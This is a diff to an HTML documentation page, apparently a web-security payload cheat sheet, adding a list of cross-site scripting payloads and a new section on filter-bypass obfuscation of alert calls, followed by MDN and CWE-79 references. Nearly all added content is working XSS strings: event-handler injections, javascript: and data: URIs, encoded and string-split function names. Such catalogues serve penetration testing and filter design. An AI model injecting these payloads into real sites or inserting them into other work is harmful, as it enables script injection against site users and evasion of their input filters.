@@ -5446,8 +5446,30 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filter Bypass Alert Obfuscation
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
   
 </li>
       
@@ -6794,8 +6816,30 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filter Bypass Alert Obfuscation
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
   
 </li>
       
@@ -7487,7 +7531,52 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <li><code>&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;</code></li>
 <li><code>&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;</code></li>
 <li><code>&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;</code></li>
-<li>`<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">xlink:href</span><span class="o">=</span><span class="s">data&amp;colon;,window.open('https://www.google.com/')</span><span class="p">&gt;</span><span class="o">&lt;</span><span class="err">/script</span>
+</code></pre></div>
+<ul>
+<li><code>&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;</code></li>
+<li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li>
+<li><code>&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X</code></li>
+<li><code>&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;</code></li>
+<li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li>
+</ul>
+<p>On Mouse Over​:</p>
+<ul>
+<li><code>&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;</code></li>
+<li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">x</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script 1=2</span>
+</code></pre></div>
+<ul>
+<li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li>
+<li><code>&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"</code></li>
+<li><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;</code></li>
+</ul>
+<!-- markdownlint-enable MD038-->
+
+<h3 id="filter-bypass-alert-obfuscation">Filter Bypass Alert Obfuscation<a class="headerlink" href="#filter-bypass-alert-obfuscation" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>(alert)(1)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>top[“al”+”ert”](1)</code></li>
+<li><code>top[/al/.source+/ert/.source](1)</code></li>
+<li><code>al\u0065rt(1)</code></li>
+<li><code>top[‘al\145rt’](1)</code></li>
+<li><code>top[‘al\x65rt’](1)</code></li>
+<li><code>top[8680439..toString(30)](1)</code></li>
+<li><code>alert?.()</code></li>
+<li><code>(alert())</code></li>
+</ul>
+<p>The payload should include leading and trailing backticks:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span><span class="sb">`</span><span class="si">${</span><span class="nx">alert</span><span class="sb">``</span><span class="si">}</span><span class="sb">`</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span>
+</code></pre></div>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS">MDN: Cross-Site Scripting (XSS)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation</a></li>
 </ul>
 
 
